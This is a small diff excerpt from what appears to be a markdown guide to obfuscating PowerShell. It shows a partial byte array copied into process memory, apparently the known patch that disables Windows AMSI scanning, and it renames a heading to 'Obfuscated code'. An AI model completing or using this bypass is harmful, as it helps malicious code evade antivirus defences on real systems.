@@ -79,7 +79,7 @@ $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0
 [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
 ```
 
-Becomes:
+## Obfuscated code
 
 ```text
 $MethodDefinition = @'
